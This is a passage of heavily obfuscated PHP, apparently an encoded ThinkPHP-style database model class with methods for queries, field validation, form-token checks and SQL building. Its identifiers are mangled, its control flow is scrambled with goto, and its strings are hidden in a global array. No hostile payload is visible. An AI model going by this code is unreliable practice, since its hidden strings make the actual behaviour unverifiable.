EèçÀˆŒ¾«: if (isset($Cìª•İÊï[$FÔÍš …ë–[271]]) && is_array($Cìª•İÊï[$FÔÍš …ë–[271]]) && !empty($BßõÂÙõÖØ) && !isset($Cìª•İÊï[$FÔÍš …ë–[278]]) && !isset($Cìª•İÊï[$FÔÍš …ë–[275]])) { foreach ($Cìª•İÊï[$FÔÍš …ë–[271]] as $EöŠÈÔ¨ó => $Cœ“±†ßãá) { $EöŠÈÔ¨ó = trim($EöŠÈÔ¨ó); if (in_array($EöŠÈÔ¨ó, $BßõÂÙõÖØ, !0)) { if (is_scalar($Cœ“±†ßãá)) { $this->_parseType($Cìª•İÊï[$FÔÍš …ë–[271]], $EöŠÈÔ¨ó); } } elseif (!is_numeric($EöŠÈÔ¨ó) && $FÔÍš …ë–[70] != substr($EöŠÈÔ¨ó, 0, 1) && !1 === strpos($EöŠÈÔ¨ó, $FÔÍš …ë–[94]) && !1 === strpos($EöŠÈÔ¨ó, $FÔÍš …ë–[256]) && !1 === strpos($EöŠÈÔ¨ó, $FÔÍš …ë–[279]) && !1 === strpos($EöŠÈÔ¨ó, $FÔÍš …ë–[280])) { unset($Cìª•İÊï[$FÔÍš …ë–[271]][$EöŠÈÔ¨ó]); } } } $this->_options_filter($Cìª•İÊï); return $Cìª•İÊï; goto dÇ’ù²”Ç‡; dÇ’ù²”Ç‡: } protected function _options_filter(&$DÊØé¯ÍøÏ) { } protected function _parseType(&$CÒõÀì½, $C‚éŒñµøœ) { $F•Ä¤·®˜° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($this->options[$F•Ä¤·®˜°[281]][$F•Ä¤·®˜°[4] . $C‚éŒñµøœ])) { $bíìáš…Ö° = strtolower($this->fields[$F•Ä¤·®˜°[248]][$C‚éŒñµøœ]); if (!1 !== strpos($bíìáš…Ö°, $F•Ä¤·®˜°[282])) { } elseif (!1 === strpos($bíìáš…Ö°, $F•Ä¤·®˜°[283]) && !1 !== strpos($bíìáš…Ö°, $F•Ä¤·®˜°[284])) { $CÒõÀì½[$C‚éŒñµøœ] = intval($CÒõÀì½[$C‚éŒñµøœ]); } elseif (!1 !== strpos($bíìáš…Ö°, $F•Ä¤·®˜°[285]) || !1 !== strpos($bíìáš…Ö°, $F•Ä¤·®˜°[286])) { $CÒõÀì½[$C‚éŒñµøœ] = floatval($CÒõÀì½[$C‚éŒñµøœ]); } elseif (!1 !== strpos($bíìáš…Ö°, $F•Ä¤·®˜°[287])) { $CÒõÀì½[$C‚éŒñµøœ] = (bool) $CÒõÀì½[$C‚éŒñµøœ]; } } } public function find($Dä™ˆğ“Ùù = array()) { goto bòÁó¦ë…½; f†“Ù¼Û´: $Dä™ˆğ“Ùù = $this->_parseOptions(); $EøÔ†Õ¼¦ = $this->db->select($Dä™ˆğ“Ùù); if (!1 === $EøÔ†Õ¼¦) { return !1; } goto e‰òÎÆ°®É; B«ÇÑµÜù: if (!empty($this->options[$BÑ—²šÂ¿Í[289]])) { return $this->returnResult($this->data, $this->options[$BÑ—²šÂ¿Í[289]]); } return $this->data; goto f’¡Ä«Öê; e‰òÎÆ°®É: if (empty($EøÔ†Õ¼¦)) { return null; } $this->data = $EøÔ†Õ¼¦[0]; $this->_afterFind($this->data, $Dä™ˆğ“Ùù); goto B«ÇÑµÜù; bòÁó¦ë…½: $BÑ—²šÂ¿Í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_numeric($Dä™ˆğ“Ùù) || is_string($Dä™ˆğ“Ùù)) { $fçÍî’òò[$this->getPk()] = intval($Dä™ˆğ“Ùù); $this->options[$BÑ—²šÂ¿Í[271]] = $fçÍî’òò; } $this->options[$BÑ—²šÂ¿Í[288]] = 1; goto f†“Ù¼Û´; f’¡Ä«Öê: } protected function _afterFind(&$aÚ§Ó¢» , $A¤Å¬Œ©â†) { } protected function returnResult($f¯ÛêËùÓĞ, $d«‡Œ…ß» = '') { $bÎ ´¦èÂ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($d«‡Œ…ß») { if (is_callable($d«‡Œ…ß»)) { return call_user_func($d«‡Œ…ß», $f¯ÛêËùÓĞ); } switch (strtolower($d«‡Œ…ß»)) { case $bÎ ´¦èÂ«[290]: return json_encode($f¯ÛêËùÓĞ); case $bÎ ´¦èÂ«[291]: return xml_encode($f¯ÛêËùÓĞ); } } return $f¯ÛêËùÓĞ; } public function parseFieldsMap($F‹ÔªªŒŸ, $béàŒäîªª = 1) { if (!empty($this->_map)) { foreach ($this->_map as $AÀÇ¾ˆˆ£™ => $d™¾Ãî­âÒ) { if ($béàŒäîªª == 1) { if (isset($F‹ÔªªŒŸ[$d™¾Ãî­âÒ])) { $F‹ÔªªŒŸ[$AÀÇ¾ˆˆ£™] = $F‹ÔªªŒŸ[$d™¾Ãî­âÒ]; unset($F‹ÔªªŒŸ[$d™¾Ãî­âÒ]); } } else { if (isset($F‹ÔªªŒŸ[$AÀÇ¾ˆˆ£™])) { $F‹ÔªªŒŸ[$d™¾Ãî­âÒ] = $F‹ÔªªŒŸ[$AÀÇ¾ˆˆ£™]; unset($F‹ÔªªŒŸ[$AÀÇ¾ˆˆ£™]); } } } } return $F‹ÔªªŒŸ; } public function setField($e¥•õ²İ¹¼, $cšÅ¹óˆÒ  = '') { if (is_array($e¥•õ²İ¹¼)) { $BİÀ­×¬Ì = $e¥•õ²İ¹¼; } else { $BİÀ­×¬Ì[$e¥•õ²İ¹¼] = $cšÅ¹óˆÒ ; } return $this->save($BİÀ­×¬Ì); } public function setAdd($aàäè™°æÖ, $b¦³Ì‰ÇÖ÷ = 1) { $F•–½†³Ù† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EƒÙ —Ø ´ = $aàäè™°æÖ . $F•–½†³Ù†[292] . $b¦³Ì‰ÇÖ÷; if ($b¦³Ì‰ÇÖ÷ < 0) { $EƒÙ —Ø ´ = $aàäè™°æÖ . $b¦³Ì‰ÇÖ÷; } return $this->setField($aàäè™°æÖ, array($F•–½†³Ù†[293], $EƒÙ —Ø ´)); } public function getField($Bæ»®©‘Ø…, $a Ï¥êÊâˆ = null) { $CÆä‡„ŒåÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[269]] = $Bæ»®©‘Ø…; $bĞÔ±–Çï‘ = $this->_parseOptions($bĞÔ±–Çï‘); $Bæ»®©‘Ø… = trim($Bæ»®©‘Ø…); if (strpos($Bæ»®©‘Ø…, $CÆä‡„ŒåÁ[47])) { if (!isset($bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[288]])) { $bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[288]] = is_numeric($a Ï¥êÊâˆ) ? $a Ï¥êÊâˆ : $CÆä‡„ŒåÁ[33]; } $dáÛˆÒÈí² = $this->db->select($bĞÔ±–Çï‘); if (!empty($dáÛˆÒÈí²)) { goto E­äƒà†–â; C†êÊºÛê: $FîİĞìÓ°¡ = array_shift($Bæ»®©‘Ø…); $cÍÁ’šªÜÅ = array(); $A‘‡ìÕñ£ = count($aĞñì¶„á); goto eœøÎ¼õ–·; E­äƒà†–â: $aĞñì¶„á = explode($CÆä‡„ŒåÁ[47], $Bæ»®©‘Ø…); $Bæ»®©‘Ø… = array_keys($dáÛˆÒÈí²[0]); $Bäƒõ°ê«– = array_shift($Bæ»®©‘Ø…); goto C†êÊºÛê; eœøÎ¼õ–·: foreach ($dáÛˆÒÈí² as $f•¯›°¡ÛÀ) { $fğ™†‰Œ–ñ = $f•¯›°¡ÛÀ[$Bäƒõ°ê«–]; if (2 == $A‘‡ìÕñ£) { $cÍÁ’šªÜÅ[$fğ™†‰Œ–ñ] = $f•¯›°¡ÛÀ[$FîİĞìÓ°¡]; } else { $cÍÁ’šªÜÅ[$fğ™†‰Œ–ñ] = is_string($a Ï¥êÊâˆ) ? implode($a Ï¥êÊâˆ, $f•¯›°¡ÛÀ) : $f•¯›°¡ÛÀ; } } return $cÍÁ’šªÜÅ; goto B£äÉƒÌ§‚; B£äÉƒÌ§‚: } } else { if (!0 !== $a Ï¥êÊâˆ) { $bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[288]] = is_numeric($a Ï¥êÊâˆ) ? $a Ï¥êÊâˆ : 1; } if ($a Ï¥êÊâˆ === $CÆä‡„ŒåÁ[251]) { unset($bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[288]]); } $f•¯›°¡ÛÀ = $this->db->select($bĞÔ±–Çï‘); if (!empty($f•¯›°¡ÛÀ)) { if ($a Ï¥êÊâˆ === $CÆä‡„ŒåÁ[251]) { return reset($f•¯›°¡ÛÀ[0]); } if (!0 !== $a Ï¥êÊâˆ && 1 == $bĞÔ±–Çï‘[$CÆä‡„ŒåÁ[288]]) { return reset($f•¯›°¡ÛÀ[0]); } foreach ($f•¯›°¡ÛÀ as $f‰ŞÊ„Õ²) { $CõØî—”Ãñ[] = $f‰ŞÊ„Õ²[$Bæ»®©‘Ø…]; } return $CõØî—”Ãñ; } } return null; } public function create($Dø¶½ƒá¢´ = '', $e„ÖåÜÇùè = '') { goto a©‚á‡Ÿá; CİÖììù¡: return $Dø¶½ƒá¢´; goto DÆ‹Œ´É‡; fµŞ¸•ï•: $Dø¶½ƒá¢´ = $this->parseFieldsMap($Dø¶½ƒá¢´, 0); $e„ÖåÜÇùè = $e„ÖåÜÇùè ? $e„ÖåÜÇùè : (!empty($Dø¶½ƒá¢´[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$C¾“ØÕø®„[269]])) { $EŠ¨Ä±¤ = $this->options[$C¾“ØÕø®„[269]]; unset($this->options[$C¾“ØÕø®„[269]]); } elseif ($e„ÖåÜÇùè == THINK_MODEL_INSERT && isset($this->insertFields)) { $EŠ¨Ä±¤ = $this->insertFields; } elseif ($e„ÖåÜÇùè == THINK_MODEL_UPDATE && isset($this->updateFields)) { $EŠ¨Ä±¤ = $this->updateFields; } goto fàöƒœİÁÖ; fàöƒœİÁÖ: if (isset($EŠ¨Ä±¤)) { if (is_string($EŠ¨Ä±¤)) { $EŠ¨Ä±¤ = explode($C¾“ØÕø®„[47], $EŠ¨Ä±¤); } if (think_config($C¾“ØÕø®„[294])) { $EŠ¨Ä±¤[] = think_config($C¾“ØÕø®„[295]); } foreach ($Dø¶½ƒá¢´ as $Dí®í‹ï => $AÕìàÖŞ÷Ö) { if (!in_array($Dí®í‹ï, $EŠ¨Ä±¤)) { unset($Dø¶½ƒá¢´[$Dí®í‹ï]); } } } if (!$this->autoValidation($Dø¶½ƒá¢´, $e„ÖåÜÇùè)) { return !1; } if (!$this->autoCheckToken($Dø¶½ƒá¢´)) { $this->error = think_lang($C¾“ØÕø®„[296]); return !1; } goto AİŞŒ¸™§Œ; a©‚á‡Ÿá: $C¾“ØÕø®„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($Dø¶½ƒá¢´)) { $Dø¶½ƒá¢´ = $_POST; } elseif (is_object($Dø¶½ƒá¢´)) { $Dø¶½ƒá¢´ = get_object_vars($Dø¶½ƒá¢´); } if (empty($Dø¶½ƒá¢´) || !is_array($Dø¶½ƒá¢´)) { $this->error = think_lang($C¾“ØÕø®„[267]); return !1; } goto fµŞ¸•ï•; AİŞŒ¸™§Œ: if ($this->autoCheckFields) { $EŠ¨Ä±¤ = $this->getDbFields(); foreach ($Dø¶½ƒá¢´ as $Dí®í‹ï => $AÕìàÖŞ÷Ö) { if (!in_array($Dí®í‹ï, $EŠ¨Ä±¤)) { unset($Dø¶½ƒá¢´[$Dí®í‹ï]); } elseif (MAGIC_QUOTES_GPC && is_string($AÕìàÖŞ÷Ö)) { $Dø¶½ƒá¢´[$Dí®í‹ï] = stripslashes($AÕìàÖŞ÷Ö); } } } $this->autoOperation($Dø¶½ƒá¢´, $e„ÖåÜÇùè); $this->data = $Dø¶½ƒá¢´; goto CİÖììù¡; DÆ‹Œ´É‡: } public function autoCheckToken($eÂ¡ŠˆåßÏ) { $CÀ «¢ò—ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($this->options[$CÀ «¢ò—ã[297]]) && !$this->options[$CÀ «¢ò—ã[297]]) { return !0; } if (think_config($CÀ «¢ò—ã[294])) { $aÓô£Â¢êå = think_config($CÀ «¢ò—ã[295]); if (!isset($eÂ¡ŠˆåßÏ[$aÓô£Â¢êå]) || Session::get($aÓô£Â¢êå)) { return !1; } list($C“Ê÷ò„¸¤, $bÌÏËäš®¨) = explode($CÀ «¢ò—ã[70], $eÂ¡ŠˆåßÏ[$aÓô£Â¢êå]); if ($bÌÏËäš®¨ && Session::get($aÓô£Â¢êå . $CÀ «¢ò—ã[94] . $C“Ê÷ò„¸¤) === $bÌÏËäš®¨) { Session::remove($aÓô£Â¢êå . $CÀ «¢ò—ã[94] . $C“Ê÷ò„¸¤); return !0; } if (think_config($CÀ «¢ò—ã[298])) { Session::remove($aÓô£Â¢êå . $CÀ «¢ò—ã[94] . $C“Ê÷ò„¸¤); } return !1; } return !0; } public function regex($BæâãÂ‡œ, $e–²»ÁàÂÁ) { $b¦±á¾é‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B´¶ÈËâ×› = array($b¦±á¾é‡[299] => $b¦±á¾é‡[300], $b¦±á¾é‡[301] => $b¦±á¾é‡[302], $b¦±á¾é‡[303] => $b¦±á¾é‡[304], $b¦±á¾é‡[305] => $b¦±á¾é‡[306], $b¦±á¾é‡[307] => $b¦±á¾é‡[308], $b¦±á¾é‡[309] => $b¦±á¾é‡[310], $b¦±á¾é‡[311] => $b¦±á¾é‡[312], $b¦±á¾é‡[286] => $b¦±á¾é‡[313], $b¦±á¾é‡[314] => $b¦±á¾é‡[315]); if (isset($B´¶ÈËâ×›[strtolower($e–²»ÁàÂÁ)])) { $e–²»ÁàÂÁ = $B´¶ÈËâ×›[strtolower($e–²»ÁàÂÁ)]; } return preg_match($e–²»ÁàÂÁ, $BæâãÂ‡œ) === 1; } private function autoOperation(&$dËİÄ¦Ø°‘, $D×“¡ò›Şì) { $Cò©˜òÊ³è =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($this->options[$Cò©˜òÊ³è[316]])) { $fÜÀ×õË = $this->options[$Cò©˜òÊ³è[316]]; unset($this->options[$Cò©˜òÊ³è[316]]); } elseif (!empty($this->_auto)) { $fÜÀ×õË = $this->_auto; } if (isset($fÜÀ×õË)) { foreach ($fÜÀ×õË as $EÆöÃ÷ëØ¼) { if (empty($EÆöÃ÷ëØ¼[2])) { $EÆöÃ÷ëØ¼[2] = THINK_MODEL_INSERT; } if ($D×“¡ò›Şì == $EÆöÃ÷ëØ¼[2] || $EÆöÃ÷ëØ¼[2] == THINK_MODEL_BOTH) { switch (trim($EÆöÃ÷ëØ¼[3])) { case $Cò©˜òÊ³è[317]: case $Cò©˜òÊ³è[318]: $Eˆª©Ã‡ƒŠ = isset($EÆöÃ÷ëØ¼[4]) ? (array) $EÆöÃ÷ëØ¼[4] : array(); if (isset($dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]])) { array_unshift($Eˆª©Ã‡ƒŠ, $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]]); } if ($Cò©˜òÊ³è[317] == $EÆöÃ÷ëØ¼[3]) { $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]] = call_user_func_array($EÆöÃ÷ëØ¼[1], $Eˆª©Ã‡ƒŠ); } else { $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]] = call_user_func_array(array(&$this, $EÆöÃ÷ëØ¼[1]), $Eˆª©Ã‡ƒŠ); } break; case $Cò©˜òÊ³è[269]: $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]] = $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[1]]; break; case $Cò©˜òÊ³è[319]: if ($Cò©˜òÊ³è[33] === $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]]) { unset($dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]]); } break; case $Cò©˜òÊ³è[320]: default: $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]] = $EÆöÃ÷ëØ¼[1]; } if (!1 === $dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]]) { unset($dËİÄ¦Ø°‘[$EÆöÃ÷ëØ¼[0]]); } } } } return $dËİÄ¦Ø°‘; } protected function autoValidation($BÆáÔØÒëš, $B”´Ù‚š›«) { $Dµ†¥ßÓ›† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($this->options[$Dµ†¥ßÓ›†[321]])) { $AÖ¼„Õáâ‘ = $this->options[$Dµ†¥ßÓ›†[321]]; unset($this->options[$Dµ†¥ßÓ›†[321]]); } elseif (!empty($this->_validate)) { $AÖ¼„Õáâ‘ = $this->_validate; } if (isset($AÖ¼„Õáâ‘)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AÖ¼„Õáâ‘ as $Cå–öïƒóÇ => $DÅğ‘ğ‹­¥) { if (empty($DÅğ‘ğ‹­¥[5]) || $DÅğ‘ğ‹­¥[5] == THINK_MODEL_BOTH || $DÅğ‘ğ‹­¥[5] == $B”´Ù‚š›«) { if (0 == strpos($DÅğ‘ğ‹­¥[2], $Dµ†¥ßÓ›†[322]) && strpos($DÅğ‘ğ‹­¥[2], $Dµ†¥ßÓ›†[323])) { $DÅğ‘ğ‹­¥[2] = think_lang(substr($DÅğ‘ğ‹­¥[2], 2, -1)); } $DÅğ‘ğ‹­¥[3] = isset($DÅğ‘ğ‹­¥[3]) ? $DÅğ‘ğ‹­¥[3] : THINK_EXISTS_VALIDATE; $DÅğ‘ğ‹­¥[4] = isset($DÅğ‘ğ‹­¥[4]) ? $DÅğ‘ğ‹­¥[4] : $Dµ†¥ßÓ›†[324]; switch ($DÅğ‘ğ‹­¥[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($BÆáÔØÒëš, $DÅğ‘ğ‹­¥)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Dµ†¥ßÓ›†[33] != trim($BÆáÔØÒëš[$DÅğ‘ğ‹­¥[0]])) { if (!1 === $this->_validationField($BÆáÔØÒëš, $DÅğ‘ğ‹­¥)) { return !1; } } break; default: if (isset($BÆáÔØÒëš[$DÅğ‘ğ‹­¥[0]])) { if (!1 === $this->_validationField($BÆáÔØÒëš, $DÅğ‘ğ‹­¥)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F„‘††˜¨‹, $CùõªöÌá½) { if (!1 === $this->_validationFieldItem($F„‘††˜¨‹, $CùõªöÌá½)) { if ($this->patchValidate) { $this->error[$CùõªöÌá½[0]] = $CùõªöÌá½[2]; } else { $this->error = $CùõªöÌá½[2]; return !1; } } return; } protected function _validationFieldItem($c²Ù®Òì„í, $dùäˆİÀë„) { $C°ôµ·„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; switch (strtolower(trim($dùäˆİÀë„[4]))) { case $C°ôµ·„[317]: case $C°ôµ·„[318]: $F‰ÉùÛŠÕ = isset($dùäˆİÀë„[6]) ? (array) $dùäˆİÀë„[6] : array(); if (is_string($dùäˆİÀë„[0]) && strpos($dùäˆİÀë„[0], $C°ôµ·„[47])) { $dùäˆİÀë„[0] = explode($C°ôµ·„[47], $dùäˆİÀë„[0]); } if (is_array($dùäˆİÀë„[0])) { foreach ($dùäˆİÀë„[0] as $aÂË÷Ä¿¯) { $B˜¢ÅŠ¹¨±[$aÂË÷Ä¿¯] = $c²Ù®Òì„í[$aÂË÷Ä¿¯]; } array_unshift($F‰ÉùÛŠÕ, $B˜¢ÅŠ¹¨±); } else { array_unshift($F‰ÉùÛŠÕ, $c²Ù®Òì„í[$dùäˆİÀë„[0]]); } if ($C°ôµ·„[317] == $dùäˆİÀë„[4]) { return call_user_func_array($dùäˆİÀë„[1], $F‰ÉùÛŠÕ); } else { return call_user_func_array(array(&$this, $dùäˆİÀë„[1]), $F‰ÉùÛŠÕ); } case $C°ôµ·„[325]: return $c²Ù®Òì„í[$dùäˆİÀë„[0]] == $c²Ù®Òì„í[$dùäˆİÀë„[1]]; case $C°ôµ·„[326]: if (is_string($dùäˆİÀë„[0]) && strpos($dùäˆİÀë„[0], $C°ôµ·„[47])) { $dùäˆİÀë„[0] = explode($C°ôµ·„[47], $dùäˆİÀë„[0]); } $bÛ‚ïîöÜÑ = array(); if (is_array($dùäˆİÀë„[0])) { foreach ($dùäˆİÀë„[0] as $aÂË÷Ä¿¯) { $bÛ‚ïîöÜÑ[$aÂË÷Ä¿¯] = $c²Ù®Òì„í[$aÂË÷Ä¿¯]; } } else { $bÛ‚ïîöÜÑ[$dùäˆİÀë„[0]] = $c²Ù®Òì„í[$dùäˆİÀë„[0]]; } if (!empty($c²Ù®Òì„í[$this->getPk()])) { $bÛ‚ïîöÜÑ[$this->getPk()] = array($C°ôµ·„[327], $c²Ù®Òì„í[$this->getPk()]); } if ($this->where($bÛ‚ïîöÜÑ)->find()) { return !1; } return !0; default: return $this->check($c²Ù®Òì„í[$dùäˆİÀë„[0]], $dùäˆİÀë„[1], $dùäˆİÀë„[4]); } } public function check($b¢ÅŒ¨‹¢®, $aœ¶¬Ü„¾, $F›ÁŸø§ù = "\162\x65\147\145\170") { $B—„®µµ— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F›ÁŸø§ù = strtolower(trim($F›ÁŸø§ù)); switch ($F›ÁŸø§ù) { case $B—„®µµ—[7]: case $B—„®µµ—[328]: $cÇŒğªôãÎ = is_array($aœ¶¬Ü„¾) ? $aœ¶¬Ü„¾ : explode($B—„®µµ—[47], $aœ¶¬Ü„¾); return $F›ÁŸø§ù == $B—„®µµ—[7] ? in_array($b¢ÅŒ¨‹¢®, $cÇŒğªôãÎ) : !in_array($b¢ÅŒ¨‹¢®, $cÇŒğªôãÎ); case $B—„®µµ—[329]: case $B—„®µµ—[330]: if (is_array($aœ¶¬Ü„¾)) { $A”¤å³Åéô = $aœ¶¬Ü„¾[0]; $F™’‰Ôè× = $aœ¶¬Ü„¾[1]; } else { list($A”¤å³Åéô, $F™’‰Ôè×) = explode($B—„®µµ—[47], $aœ¶¬Ü„¾); } return $F›ÁŸø§ù == $B—„®µµ—[329] ? $b¢ÅŒ¨‹¢® >= $A”¤å³Åéô && $b¢ÅŒ¨‹¢® <= $F™’‰Ôè× : $b¢ÅŒ¨‹¢® < $A”¤å³Åéô || $b¢ÅŒ¨‹¢® > $F™’‰Ôè×; case $B—„®µµ—[331]: case $B—„®µµ—[332]: return $F›ÁŸø§ù == $B—„®µµ—[331] ? $b¢ÅŒ¨‹¢® == $aœ¶¬Ü„¾ : $b¢ÅŒ¨‹¢® != $aœ¶¬Ü„¾; case $B—„®µµ—[333]: $a„™˜‡ĞÙ = mb_strlen($b¢ÅŒ¨‹¢®, $B—„®µµ—[334]); if (strpos($aœ¶¬Ü„¾, $B—„®µµ—[47])) { list($A”¤å³Åéô, $F™’‰Ôè×) = explode($B—„®µµ—[47], $aœ¶¬Ü„¾); return $a„™˜‡ĞÙ >= $A”¤å³Åéô && $a„™˜‡ĞÙ <= $F™’‰Ôè×; } else { return $a„™˜‡ĞÙ == $aœ¶¬Ü„¾; } case $B—„®µµ—[335]: list($aØäÓÂ¬‚—, $EÄ¸ŞÆ®) = explode($B—„®µµ—[47], $aœ¶¬Ü„¾); if (!is_numeric($aØäÓÂ¬‚—)) { $aØäÓÂ¬‚— = strtotime($aØäÓÂ¬‚—); } if (!is_numeric($EÄ¸ŞÆ®)) { $EÄ¸ŞÆ® = strtotime($EÄ¸ŞÆ®); } return NOW_TIME >= $aØäÓÂ¬‚— && NOW_TIME <= $EÄ¸ŞÆ®; case $B—„®µµ—[336]: return in_array(get_client_ip(), explode($B—„®µµ—[47], $aœ¶¬Ü„¾)); case $B—„®µµ—[337]: return !in_array(get_client_ip(), explode($B—„®µµ—[47], $aœ¶¬Ü„¾)); case $B—„®µµ—[324]: default: return $this->regex($b¢ÅŒ¨‹¢®, $aœ¶¬Ü„¾); } } public function query($dŸµÅ¢·¼, $D‘è“¾öÃ¨ = false) { $AÊÑË³óÊê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_bool($D‘è“¾öÃ¨) && !is_array($D‘è“¾öÃ¨)) { $D‘è“¾öÃ¨ = func_get_args(); array_shift($D‘è“¾öÃ¨); } $dŸµÅ¢·¼ = str_replace(array($AÊÑË³óÊê[227], $AÊÑË³óÊê[338]), $AÊÑË³óÊê[50], $dŸµÅ¢·¼); $dŸµÅ¢·¼ = $this->parseSql($dŸµÅ¢·¼, $D‘è“¾öÃ¨); return $this->db->query($dŸµÅ¢·¼); } public function execute($Aó½èÄáÀš, $F˜¶ñ«âçƒ = false) { if (!is_bool($F˜¶ñ«âçƒ) && !is_array($F˜¶ñ«âçƒ)) { $F˜¶ñ«âçƒ = func_get_args(); array_shift($F˜¶ñ«âçƒ); } $Aó½èÄáÀš = $this->parseSql($Aó½èÄáÀš, $F˜¶ñ«âçƒ); return $this->db->execute($Aó½èÄáÀš); } protected function parseSql($Fº§ñ÷§, $BÂ—¸ÇŒÏ“) { $F£Ó“½Éµ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!0 === $BÂ—¸ÇŒÏ“) { $AÏ¥ø¡ƒ®© = $this->_parseOptions(); $Fº§ñ÷§ = $this->db->parseSql($Fº§ñ÷§, $AÏ¥ø¡ƒ®©); } elseif (is_array($BÂ—¸ÇŒÏ“)) { $BÂ—¸ÇŒÏ“ = array_map(array($this->db, $F£Ó“½Éµ¯[339]), $BÂ—¸ÇŒÏ“); $Fº§ñ÷§ = vsprintf($Fº§ñ÷§, $BÂ—¸ÇŒÏ“); } else { $Fº§ñ÷§ = strtr($Fº§ñ÷§, array($F£Ó“½Éµ¯[340] => $this->getTableName(), $F£Ó“½Éµ¯[341] => think_config($F£Ó“½Éµ¯[240]))); } $this->db->setModel($this->name); return $Fº§ñ÷§; } public function db($a¨‰Ø•†Ø = '', $C‹®õ× = '', $a†ªèìÁÈ = array()) { goto bÔ‡šÛ„â; AÕ¢î’ë‚“: $F¾”¡Ã¹ÆÚ[$a¨‰Ø•†Ø] = $C‹®õ×; $this->db = $B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø]; $this->_after_db(); goto b¹òàáÕÓ©; f“Ñ˜æ×à: static $B†ÔÆ¶Ÿ = array(); if (!isset($B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø]) || isset($B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø]) && $C‹®õ× && $F¾”¡Ã¹ÆÚ[$a¨‰Ø•†Ø] != $C‹®õ×) { if (!empty($C‹®õ×) && is_string($C‹®õ×) && !1 === strpos($C‹®õ×, $c‡Ôº‘¥æá[8])) { $C‹®õ× = think_config($C‹®õ×); } $B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø] = Db::getInstance($C‹®õ×); } elseif (NULL === $C‹®õ×) { $B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø]->close(); unset($B†ÔÆ¶Ÿ[$a¨‰Ø•†Ø]); return; } if (!empty($a†ªèìÁÈ)) { if (is_string($a†ªèìÁÈ)) { parse_str($a†ªèìÁÈ, $a†ªèìÁÈ); } foreach ($a†ªèìÁÈ as $cèš¾»Š†– => $aÙ…²Ùæçá) { $this->setProperty($cèš¾»Š†–, $aÙ…²Ùæçá); } } goto AÕ¢î’ë‚“; bÔ‡šÛ„â: $c‡Ôº‘¥æá =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($c‡Ôº‘¥æá[33] === $a¨‰Ø•†Ø && $this->db) { return $this->db; } static $F¾”¡Ã¹ÆÚ = array(); goto f“Ñ˜æ×à; b¹òàáÕÓ©: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto E˜«öÁÑˆ¬; E˜«öÁÑˆ¬: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $có›ÏÒ„Û = get_class($this); if ($có›ÏÒ„Û == $_SERVER[ó¬â¥‰ÊÔ¤Ç£][342]) { return $this->name; } $this->name = substr($có›ÏÒ„Û, 0, -5); } return $this->name; } public function getTableName() { $C†ÏÈÄ‡”î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($this->trueTableName)) { $Bóİ›åÜ©É = !empty($this->tablePrefix) ? $this->tablePrefix : $C†ÏÈÄ‡”î[33]; if (!empty($this->tableName)) { $Bóİ›åÜ©É .= $this->tableName; } else { $Bóİ›åÜ©É .= think_parse_name($this->name); } $this->trueTableName = strtolower($Bóİ›åÜ©É); } return (!empty($this->dbName) ? $this->dbName . $C†ÏÈÄ‡”î[94] : $C†ÏÈÄ‡”î[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e´ŞÖœí†Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return isset($this->fields[$e´ŞÖœí†Å[247]]) ? $this->fields[$e´ŞÖœí†Å[247]] : $this->pk; } public function getDbFields() { $c‰Å‡ª¿ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($this->options[$c‰Å‡ª¿ø[275]])) { $F˜¼çá»Ï = $this->db->getFields($this->options[$c‰Å‡ª¿ø[275]]); return $F˜¼çá»Ï ? 